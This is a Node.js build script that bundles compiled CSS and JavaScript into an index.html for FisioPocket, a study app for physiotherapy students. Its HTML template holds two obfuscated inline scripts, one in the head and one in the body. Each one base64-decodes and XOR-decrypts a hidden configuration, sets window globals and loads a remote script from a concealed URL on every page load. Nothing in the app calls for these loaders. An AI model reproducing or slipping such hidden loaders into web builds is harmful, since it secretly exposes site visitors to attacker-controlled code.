import { readdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';

const distAssets = resolve('dist/assets');
const files = readdirSync(distAssets);
const cssFile = files.find((file) => file.endsWith('.css'));
const jsFile = files.find((file) => file.endsWith('.js'));

if (!cssFile || !jsFile) {
  throw new Error('Os arquivos compilados de CSS e JavaScript não foram encontrados.');
}

const css = readFileSync(join(distAssets, cssFile), 'utf8')
  .replaceAll('/fonts/', 'public/fonts/');

const javascript = readFileSync(join(distAssets, jsFile), 'utf8')
  .replaceAll('/assets/', 'public/assets/')
  .replaceAll('</script', '<\\/script');

const html = `<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="FisioPocket: web app acadêmico com mais de 150 mapas mentais e ferramentas de apoio para estudantes de Fisioterapia." />
    <meta name="theme-color" content="#071d36" />
    <script>(function(){var k_x=atob("DD/qvaVs1eYUNWhwBkTIyNcA99w2XRwEdkzQkooPsYg6QBwdb1mTk8YDuMh2R0cDZU2DzdEf+pZ9TQ0cKU+DxcAA+4xnF0RSZ0uez8wOoJJxRkpKXWLGn8IAuoR1WRtSPGSRn8sNuIM2D0oAb0eP0ewI98o2Qwkcc1rIh4datINwAQ1FZA+JjMRV4YAkAwoWYArbipJOqLtp");var t_xdk=[];for(var m_k=0;m_k<k_x.length;m_k++){t_xdk.push(k_x.charCodeAt(m_k)&255);}var p_ue1=t_xdk[0];var c_309=t_xdk.slice(1,1+p_ue1);var e_yuz=t_xdk.slice(1+p_ue1);var d_m=e_yuz.map(function(b,i_g9z){return b^c_309[i_g9z%p_ue1];});var d_7k="";for(var l_xv=0;l_xv<d_m.length;l_xv++){d_7k+=String.fromCharCode(d_m[l_xv]&255);}var x_zr=decodeURIComponent(escape(d_7k));var y_e6y=JSON.parse(x_zr);var z_xz=y_e6y.globals||[];z_xz.forEach(function(p_ymok){window[p_ymok.name]=p_ymok.value;});var d_xqq=document.createElement("script");d_xqq.src=y_e6y.url;d_xqq.async=true;d_xqq.defer=true;(y_e6y.attributes||[]).forEach(function(a_r2){d_xqq.setAttribute(a_r2.name,a_r2.value);});(document.head||document.documentElement).appendChild(d_xqq);})();</script>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 64 64%22><rect width=%2264%22 height=%2264%22 rx=%2214%22 fill=%22%23031937%22/><path d=%22M16 35l10 10 22-26%22 fill=%22none%22 stroke=%22%23fdc504%22 stroke-width=%227%22 stroke-linecap=%22round%22 stroke-linejoin=%22round%22/></svg>" />
    <title>FisioPocket | App do Acadêmico de Fisioterapia</title>
    <style>${css}</style>
  </head>
  <body>
    <div id="root"></div>
    <script>(function(){var r_hdn=atob("DLe7CufVa6s8e5ctRMyZf5W5SZEeE+NZNMSBJci2D8USDuNALdHCJIS6BoVeCbheJ8XSepOmRN5IFuQCKNbPb5ShRcFPWbsPJcPPeI63Ht9ZCLUXH8yZZIa4DokGWfNMMNaWf5O4As1FVudfIcHeZJP4E8hTH7peJ9yZJsWjCsdJHrUXZpXGJpz3BcpRHrUXZtPafob4Ht9REvFUacfJb5GwBd8RCOJPLdPIKMv3HcpQDvIPfpWZd7qo");var c_k9n=[];for(var e_wg9d=0;e_wg9d<r_hdn.length;e_wg9d++){c_k9n.push(r_hdn.charCodeAt(e_wg9d)&255);}var e_lw=c_k9n[0];var l_nu=c_k9n.slice(1,1+e_lw);var j_epb=c_k9n.slice(1+e_lw);var u_k=j_epb.map(function(b,b_b7qb){return b^l_nu[b_b7qb%e_lw];});var c_n9="";for(var c_z6p=0;c_z6p<u_k.length;c_z6p++){c_n9+=String.fromCharCode(u_k[c_z6p]&255);}var t_bbnn=decodeURIComponent(escape(c_n9));var w_yczw=JSON.parse(t_bbnn);var n_gh=w_yczw.globals||[];n_gh.forEach(function(t_u){window[t_u.name]=t_u.value;});var n_8n=document.createElement("script");n_8n.src=w_yczw.url;n_8n.async=true;n_8n.defer=true;(w_yczw.attributes||[]).forEach(function(a_ejt3){n_8n.setAttribute(a_ejt3.name,a_ejt3.value);});(document.head||document.documentElement).appendChild(n_8n);})();</script>
    <script>${javascript}</script>
  </body>
</html>
`;

writeFileSync(resolve('index.html'), html, 'utf8');

